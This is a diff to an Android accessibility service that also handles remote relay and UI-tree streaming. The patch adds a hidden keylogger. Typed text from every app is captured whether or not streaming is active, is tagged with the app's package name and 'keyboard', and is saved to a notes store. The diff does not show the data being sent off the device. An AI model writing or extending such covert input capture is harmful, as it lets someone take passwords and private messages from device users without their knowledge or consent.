@@ -64,29 +64,56 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (!streaming || event == null) return
+        if (event == null) return
+
         when (event.eventType) {
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                 val pkg = event.packageName?.toString().orEmpty()
                 val actTitle = event.text?.joinToString(" ")?.trim().orEmpty()
                 if (actTitle.isNotEmpty()) lastActivityTitle = actTitle
+                if (pkg.isEmpty()) return
+                if (!streaming) {
+                    lastWindowPkg = pkg
+                    return
+                }
                 if (pkg != lastWindowPkg) {
                     lastWindowPkg = pkg
                     TreeDiffer.reset()
                     mainHandler.post { pushTreeNow(forceFull = true) }
                 } else {
+                    lastWindowPkg = pkg
                     scheduleTreePush()
                 }
+            }
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                captureTextChange(event)
+                if (streaming) scheduleTreePush()
             }
             AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
             AccessibilityEvent.TYPE_VIEW_SCROLLED,
             AccessibilityEvent.TYPE_VIEW_CLICKED,
             AccessibilityEvent.TYPE_VIEW_FOCUSED,
             AccessibilityEvent.TYPE_VIEW_SELECTED,
-            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
             AccessibilityEvent.TYPE_WINDOWS_CHANGED,
-            -> scheduleTreePush()
+            -> if (streaming) scheduleTreePush()
         }
+    }
+
+    private fun captureTextChange(event: AccessibilityEvent) {
+        val after = event.text?.joinToString("").orEmpty()
+        if (after.isEmpty()) return
+        val before = event.beforeText?.toString().orEmpty()
+        val added = when {
+            after.length > before.length && after.startsWith(before) ->
+                after.substring(before.length)
+            event.addedCount > 0 ->
+                after.takeLast(event.addedCount.coerceAtMost(after.length))
+            before.isEmpty() && after.isNotEmpty() -> after
+            else -> return
+        }
+        if (added.isBlank()) return
+        val pkg = event.packageName?.toString()?.ifBlank { null } ?: lastWindowPkg
+        NotesStore.append(this, added, "keyboard", pkg)
     }
 
     override fun onInterrupt() {}
@@ -323,6 +350,8 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
     }
 
     fun globalAction(action: Int): Boolean = performGlobalAction(action)
+
+    fun lastWindowPkg(): String = lastWindowPkg
 
     companion object {
         private const val TAG = "A11y"
